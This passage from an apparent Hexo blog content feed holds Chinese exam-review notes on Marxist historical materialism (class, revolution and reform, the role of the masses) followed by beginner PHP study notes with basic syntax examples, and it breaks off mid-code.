产品的出现，为阶级的产生提供了可能性；生产资料私有制的出现，是阶级产生的可能性变成</p><p>了现实。】</p><p>什么是阶级：所谓阶级，就是这样一些集团，由于它们在一定社会经济结构中所处的地位不同，其中一个集团能够占有另一个集团的劳</p><p>动。阶级首先是一个经济范畴，划分阶级的唯一标准是经济标准。</p><p>阶级斗争是指各对抗阶级之间的斗争，其中包括剥削阶级和被剥削阶级之间的斗争，也包括上升时期的剥削阶级和腐朽没落的剥削阶级之</p><p>间的斗争。物质利益的对立是阶级斗争的根源。</p><p>革命和改革在社会发展中的作用：</p><p>社会革命和社会改革是社会运动的两种基本形式。社会革命和社会改革都是推动社会发展的动力。</p><p>社会革命是阶级斗争的最高表现。社会革命是指夺取国家政权的斗争。革命的首要的基本的标志是国家政权从反动阶级手里转移到革命的</p><p>进步的阶级手里。只有进步的革命的阶级反对反动统治阶级的围绕国家政权的斗争，才是社会革命。</p><p>社会革命是社会基本矛盾的必然产物。社会革命的最深刻的根源，就在于生产力和生产关系之间的矛盾以及经济基础和上层建筑之间的矛</p><p>盾。所以说革命的根本问题是国家政权问题。</p><p>暴力革命是社会革命的基本形式，并不意味着否定在特定的社会历史条件下，有革命和平发展的可能性，</p><p>马克思说：“革命是历史的火车头”这句话形象而深刻地说明了社会革命在社会发展中的重大作用：</p><p>首先，社会革命是阶级社会由低级向高级发展的决定性手段。</p><p>其次，人民群众在革命时期能发挥出创造历史的巨大的主动性和积极性。</p><p>再次，革命阶级在革命斗争中受到锻炼和改造，成为建设新社会的基础。</p><p>社会改革及其在社会发展中的作用（简答题）</p><p>社会改革是在一定社会制度下，为了解决生产关系不适合生产力、上层建筑不适合经济基础的某些部分或环节，使该社会制度得到持续存</p><p>在与发展或自我完善，而对社会体制进行的改善与革新。</p><p>社会革命与社会改革都是为了解决生产力和生产关系、经济基础和上层建筑的矛盾，从而推动社会发展的历史运动形式。</p><p>社会改革推动社会发展的作用，主要表现在以下几个方面：</p><p>第一、社会改革可以巩固新生的社会制度或使原有的社会制度持续存在并获得一定程度的发展。 第二、在社会主义社会以前，社会改</p><p>革为新社会制度的诞生作量变和部分质变的准备。</p><p>第三、在社会经济、政治等社会体制改革的过程中，必然伴随着人们思想观念和价值取向的变更。</p><p>社会革命与社会改革二者之间又有明显的区别。</p><p>首先，社会革命是人类社会的根本质变；社会改革则是同一社会制度总的量变过程中的部分质变，不改变社会制度的根本性质。</p><p>其次，社会革命目的是推翻反动统治阶级的国家政权；社会改革目的是维护和巩固统治阶级的统治地位。因此，社会革命一般是由下层群</p><p>众首先发动的，社会改革则是自上而下展开的。</p><p>再次，从历史上看，社会革命往往要通过暴力革命的形式；社会改革虽然也要付出代价，甚至流血牺牲，但一般不需要采取大规模的武装</p><p>斗争和暴力冲突的形式。</p><p>我国的改革之所以是社会主义制度的自我完善，是由社会主义社会基本矛盾的性质和特点决定的。改革的目的是兴利除弊。</p><p>我国的改革是在中国共产党的领导下社会主义制度的自我完善过程。我国的改革是在安定团结的政治环境中的社会主义自我完善过程。</p><p>我国的改革必须坚持四项基本原则和坚持改革开放。</p><p>文化的作用：</p><p>社会主义先进文化具有多方面的功能和作用。首先，它具有坚持和培育民族精神的功能。其次，它具有切实加强思想道德建设的功能。再</p><p>次，它具有大力发展教育和科学事业的功能。</p><p>文化的社会功能主要表现在以下四个方面。</p><p>第一、文化具有信息功能。 </p><p>第二、文化具有教化、培育和塑造人的功能</p><p>第三、文化具有促进社会发展的功能。</p><p>第四、文化具有认识功能。</p><p>10、马克思主义关于人的本质的观点：</p><p>劳动是人的一般本质；一切社会关系的总和是具体人的本质；人的需要也是人的本质。</p><p>11、人民群众在历史发展中的决定作用（即创造者的作用）：</p><p>人民群众是指推动历史发展的绝大多数社会成员的总和。这个范畴既有量的规定性，又有质的规定性。从量的规定性来看，它是指社会成</p><p>员的大多数，是相对于个人而言的；从质的规定性来看，它是指一切推动历史发展和社会进步的社会力量。人民群众是一个历史范畴，在</p><p>不同国家或同一国家的不同历史时期有不同的内容。我国现阶段人民群众的内容是：包括知识分子在内的工人阶级和广大农民，始终是推</p><p>动我国先进生产力发展和社会全面进步的根本力量；一切赞成、拥护和参加社会主义建设的社会集团及拥护社会主义和赞成祖国统一的爱</p><p>国者，也都属于群众的范围。社会新阶层属于人民群众的范畴。</p><p>人民群众推动历史发展的作用，主要表现在以下三个方面。</p><p>第一、人民群众是物质财富的创造者。</p><p>第二、人民群众是精神财富的创造者。</p><p>第三、人民群众是实现社会变革的决定力量。</p><p>历史唯物主义与历史唯心主义在人民群众作用问题上的分歧：</p><p>历史唯心主义从 社会意识决定社会存在的前提出发，片面夸大了极少数的英雄人物及其思维、意志在社会发展中的作用，认为历史是由</p><p>英雄豪杰、帝王将相、立法者、思想家创造的，否认广大人民群众是推动历史发展的决定力量。</p><p>历史唯物主义从社会存在决定社会意识和物质资料的生产方式是人类社会存在和发展的基础的基本原理出发，认为人类历史首先是生产发</p><p>展的历史，是物质生产的承担者劳动群众的历史，于是得出了人民群众是历史的创造者的结论。</p><p>人民群众是历史的创造者原理（含义、表现及其社会制约性和意义）：</p><p>既然人民群众是历史的创造者，我们就必须坚持以人为本。历史是人民群众创造的，但人民群众却不能随心所欲的创造历史，人民群众创</p><p>造历史的活动受既定的历史条件的制约。</p><p>无产阶级政党的群众观点和群众路线（简答、论述题）</p><p>群众观点是无产阶级政党的根本观点，主要包括以下四个内容：</p><p>第一、人民群众自己解放自己的观点；</p><p>第二、全心全意为人民服务的观点；</p><p>第三、向人民群众负责的观点；</p><p>第四、向人民群众学习的观点。 </p><p>党的群众路线的内容是：“一切为了群众，一切依靠群众，从群众中来，到群众中去。”</p><p>“一切为了群众”，这是群众路线的基本出发点和最终归宿。“一切依靠群众”，这是群众路线的根本要求。“从群众中来，到群众中</p><p>去”，这是无产阶级政党领导方法，也是群众路线的基本工作方法。</p><p>在改革开放和现代化建设的新形势下，坚持党的群众路线，具有十分重大的意义。推进党的作风建设，核心是保持党同人民群众的血肉联</p><p>系。我们党的最大政治优势是密切联系群众，党执政后的最大危险是脱离群众。</p><p>杰出人物在历史上的重要作用及其评价：</p><p>杰出人物在历史发展中的作用，主要表现在以下几个方面：</p><p>第一、一般地说，先进阶级的政治代表人物能够反映他们所处的那个时代的发展趋势，比同时代、同阶级的人站得高，看得远，能够提出</p><p>社会发展的先进思想和主张。</p><p>第二、先进阶级的政治代表人物，能够根据他们的先进思想和主张，制定具体的纲领、路线、政策和战略、策略，并动员和组织本阶级成</p><p>员与广大人民群众同阻碍社会进步的反动阶级、反动社会势力进行斗争。</p><p>第三、在历史发展的一定阶段上，某些占统治地位的剥削阶级的代表人物，在特定的社会条件下，可能成为“开明的政治家”，他们的一</p><p>些主张和改革措施，也对社会发展起某些促进和推动作用。</p><p>第四、杰出的科学家、思想家、理论家、教育家、文学艺术家等等的创造性活动及其成果，对于人类科学文化教育事业的发展和社会的物</p><p>质文明与精神文明水平的提高起着重要的作用，有力地推动了历史的发展和社会的进步。正确认识和评价杰出人物的历史作用，需要掌握以下几个基本观点和方法：（简答、论述题）</p><p>第一、杰出人物是一定历史条件下的产物，要正确认识杰出人物的历史作用，坚持历史主义原则。实事造英雄，是历史唯物主义的观点。</p><p>第二、在阶级社会里杰出人物，特别是政治家、思想家、理论家、军事家，总是一定阶级的代表，他们的历史作用同他们所代表的那个阶</p><p>级的历史作用是分不开的。因此，要正确认识杰出人物的历史作用，必须对他们作阶级分析。</p><p>第三、杰出人物的出现及其历史作用都是必然性与偶然性的辩证统一，因此必须用必然性与偶然性辩证统一的观点来分析杰出人物及其历</p><p>史作用。</p><p>第四、任何杰出人物都有巨大的历史功绩，也必然会有这样那样的缺点或错误。因此，对他们的历史作用要作全面的分析与评价，既不能</p><p>肯定一切，也不能否定一切。</p><p>想而服务。</p>]]></content>
      
      
      <categories>
          
          <category> 马原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP</title>
      <link href="2021/04/19/PHP/"/>
      <url>2021/04/19/PHP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>不会，看菜鸟教程吧</p><p><a href="https://www.runoob.com/php/php-tutorial.html">PHP教程</a></p><a id="more"></a><p>考试（选择10 * 3 判断10 * 2 简答3 * 10 编程 20）</p><p>大题重点：数据库（mysql或者PDO）与session</p><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h3 id="web工作原理"><a href="#web工作原理" class="headerlink" title="web工作原理"></a>web工作原理</h3><p><strong>通过网络运行</strong></p><p><strong>服务器，客户端模型B/S</strong></p><p><strong>URL如何对应服务器文件</strong></p><p><strong>PHP在哪里运行，结果是什么</strong></p><p>一般运行在服务器上</p><p>HTML,JS,CSS前端技术</p><p><strong>URL包含哪些部分远程调用，参数</strong></p><p>HTTP协议</p><h3 id="静态与动态页面"><a href="#静态与动态页面" class="headerlink" title="静态与动态页面"></a>静态与动态页面</h3><p>get post方法</p><p>get传参大小有限制，不可创建文件</p><p>post传参大小一般无限制，可以创建文件</p><p><strong>服务器端的区别</strong></p><h3 id="PHP服务器"><a href="#PHP服务器" class="headerlink" title="PHP服务器"></a>PHP服务器</h3><p>LAMP</p><p> <em>LAMP</em>(Linux + Apache + MySQL/MariaDB + PHP) </p><p>运行平台</p><p>如何安装与配置</p><p>phpinfo函数（重要！考试没法考）</p><h1 id="语言基础"><a href="#语言基础" class="headerlink" title="语言基础"></a>语言基础</h1><h3 id="html与php混合编程"><a href="#html与php混合编程" class="headerlink" title="html与php混合编程"></a>html与php混合编程</h3><p><strong>如何解析</strong>  </p><p>例如</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">一般来说，对于php，""里面的变量会输出其对应的值，''里面的原样输出<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'$a'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$a</span></span>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;input type="text" name="name">'</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;input type="text" name="fname">'</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>分段</strong></p><p><strong>一段不完整语法（循环/判断）</strong></p><p>编程，循环输出表格</p><p>示例 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;table border=1 width=1200>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;tr>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;td>test&lt;/td>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;td>name&lt;/td>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;td>time&lt;/td>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;/tr>'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$temp</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//动态生成表格</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;tr>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;td>'</span> <span class="token punctuation">.</span> <span class="token variable">$i</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/td>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;td>&lt;a href="3-3.php?uid='</span> <span class="token punctuation">.</span> <span class="token variable">$i</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'"> '</span> <span class="token punctuation">.</span> <span class="token variable">$i</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">' &lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;td>'</span> <span class="token punctuation">.</span> <span class="token variable">$i</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'&lt;/td>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;/tr>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/04/19/PHP/image-20210525151652202.png" alt="image-20210525151652202" loading="lazy"></p><p><strong>include和include_once</strong></p><p>include可以多次包含</p><p>include_once只能包含一次</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">index.php包含两次<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span><span class="token comment">// 其他代码</span><span class="token comment">//</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>index.php只包含一次<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span><span class="token comment">// 其他代码</span><span class="token comment">//</span><span class="token keyword">include_once</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h4><p>boolean</p><p>integer</p><p>float</p><p>字符串：</p><p><strong>单引号双引号区别</strong></p><p><strong>字符串连接</strong></p><p>字符串操作</p><p>object</p><p>array</p><p>特殊类型</p><p>resource</p><p>null</p><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><p><strong>强制转换</strong></p><p><strong>隐含</strong></p><p><strong>字符串与数字类型</strong></p><p><strong>检测数据类型（39页）</strong></p><h3 id="常量（40）"><a href="#常量（40）" class="headerlink" title="常量（40）"></a>常量（40）</h3><p><strong>声明</strong></p><p><code>define</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 区分大小写的常量名</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GREETING"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"欢迎访问 Runoob.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">GREETING</span><span class="token punctuation">;</span>    <span class="token comment">// 输出 "欢迎访问 Runoob.com"</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> greeting<span class="token punctuation">;</span>   <span class="token comment">// 输出 "greeting"</span><span class="token delimiter important">?></span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// 不区分大小写的常量名</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GREETING"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"欢迎访问 Runoob.com"</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> greeting<span class="token punctuation">;</span>  <span class="token comment">// 输出 "欢迎访问 Runoob.com"</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>使用</strong></p><p><strong>检测</strong></p><p><strong>预定义常量（41）</strong></p><p>了解即可</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="如何声明变量"><a href="#如何声明变量" class="headerlink" title="如何声明变量"></a>如何声明变量</h4><p><strong>变量声明无类型</strong></p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">php变量是弱类型的PHP 变量规则：- 变量以 $ 符号开始，后面跟着变量的名称- 变量名必须以字母或者下划线字符开始- 变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）- 变量名不能包含空格- 变量名是区分大小写的（$y 和 $Y 是两个不同的变量）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>测试未声明的变量</strong></p><p><code>isset()</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span> <span class="token comment">// 结果为 TRUE，所以后边的文本将被打印出来。</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"变量已设置。"</span> <span class="token punctuation">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token comment">// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。</span><span class="token comment">// the return value of isset().</span><span class="token comment">//unset() 释放变量</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"anothertest"</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// TRUE</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// TRUE</span> <span class="token keyword">unset</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// FALSE</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// FALSE</span> <span class="token variable">$foo</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// FALSE</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>引用变量</strong></p><p>即用不同的名字访问同一个变量</p><p><code>$b =&amp;$a;</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token double-quoted-string string">"ABC"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//这里输出:ABC</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//这里输出:ABC</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token double-quoted-string string">"EFG"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//这里输出:EFG</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//这里输出:EFG</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token double-quoted-string string">"HHH"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//这里输出:HHH</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//这里输出:HHH</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">+</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//输出１</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//这里$b传递给函数的其实是$b的变量内容所处的内存地址，通过在函数里改变$a的值　就可以改变$b的值了</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token comment">//输出101</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="变量作用域（44）"><a href="#变量作用域（44）" class="headerlink" title="变量作用域（44）"></a>变量作用域（44）</h4><p><strong>全局</strong></p><p>与JAVA差不多</p><p>外部定义的都是全局的，</p><p>函数内是局部的，只在函数内有效</p><p>在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 <strong>global</strong> 关键字</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">;</span>    <span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token comment">// 输出 15</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>静态</p><p>当一个函数完成时，它的所有变量通常都会被删除。然而，有时候希望某个局部变量不要被删除。</p><p>要做到这一点，需要在第一次声明变量时使用 <strong>static</strong> 关键字：</p><p>然后，每次调用该函数时，该变量将会保留着函数前一次被调用时的值。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">testStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token variable">$val</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$val</span><span class="token punctuation">;</span>    <span class="token variable">$val</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">testStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//output 1</span><span class="token function">testStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//output 2</span><span class="token function">testStatic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//output 3</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="可变变量（46）"><a href="#可变变量（46）" class="headerlink" title="可变变量（46）"></a>可变变量（46）</h4><p>$$的意义</p><p>从右到左解析</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'hello'</span><span class="token punctuation">;</span><span class="token variable">$$a</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'world'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$a</span></span> $<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token comment">//输出hello world</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$a</span></span> <span class="token interpolation"><span class="token variable">$hello</span></span>"</span><span class="token punctuation">;</span><span class="token comment">//输出hello world</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h4><p><strong>$_POST</strong></p><p><strong>$_GET</strong></p><p><strong>$_REQUEST</strong></p><p><strong>$_SESSION</strong></p><p><strong>$_COOKIE</strong></p><p><strong>$_FILE</strong></p><h3 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h3><p>大多与C差不多</p><p><strong>字符串</strong></p><p><code>.</code></p><p><img src="/2021/04/19/PHP/image-20210524131448654.png" alt="image-20210524131448654" loading="lazy"></p><p>对于 “+”</p><p>true=1</p><p>对于字符串运算，PHP会自动截取最前面的数字进行运算，若开头为字母，则把它当作0运算</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'12aa12'</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token single-quoted-string string">'a123aa12'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> @<span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token operator">+</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>逻辑===</strong></p><p><strong>== 与 ===的区别</strong></p><p>== 比较数值， ===既比较数值也比较类型</p><p><strong>！ ==</strong></p><p>===的反面，即类型不等或者数值不等</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'1'</span><span class="token punctuation">;</span><span class="token comment">//$b = '1abc';</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token comment">//true</span><span class="token comment">//    if($a===$b)//false</span><span class="token comment">//    